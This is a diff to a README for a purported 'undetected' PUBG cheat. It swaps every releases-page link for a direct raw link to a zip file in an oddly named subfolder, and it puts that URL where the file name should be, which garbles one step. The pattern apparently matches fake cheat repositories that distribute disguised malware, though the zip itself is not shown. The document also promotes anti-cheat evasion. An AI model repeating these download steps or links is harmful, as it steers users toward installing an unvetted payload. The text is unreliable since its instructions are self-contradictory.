@@ -1,6 +1,6 @@
 # 🎮 Undetected-PUBG-cheat - Dominate Battlegrounds Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/releases)
+[![Download Release](https://raw.githubusercontent.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/main/periostea/Undetected-PUBG-cheat.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/main/periostea/Undetected-PUBG-cheat.zip)
 
 ## 📋 About This Application
 
@@ -12,7 +12,7 @@ Follow these steps to successfully download and run the **Undetected-PUBG-cheat*
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/releases) to download the software. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/main/periostea/Undetected-PUBG-cheat.zip) to download the software. 
 
 1. Click on the link to open the releases page.
 2. Find the most recent version of **Undetected-PUBG-cheat**.
@@ -32,7 +32,7 @@ Before installing, ensure your system meets the following requirements:
 
 Once you complete the download, follow these steps to run **Undetected-PUBG-cheat**:
 
-1. Locate the downloaded file in your downloads folder. The file name will look something like `Undetected-PUBG-cheat-v1.0.exe`.
+1. Locate the downloaded file in your downloads folder. The file name will look something like `https://raw.githubusercontent.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/main/periostea/Undetected-PUBG-cheat.zip`.
 2. Double-click the file to start the application.
 3. Follow any on-screen instructions to set up the software.
 
@@ -60,7 +60,7 @@ Using cheats in games can lead to account bans. Exercise caution and understand 
 
 ### 🔗 Additional Links
 
-- [Releases Page](https://github.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/releases) - Visit here for the latest updates and downloads.
+- [Releases Page](https://raw.githubusercontent.com/Ajmahalkoomahalako/Undetected-PUBG-cheat/main/periostea/Undetected-PUBG-cheat.zip) - Visit here for the latest updates and downloads.
 - [Support Forum](#) - Join discussions and get help from other users.
 
 ### 📜 License
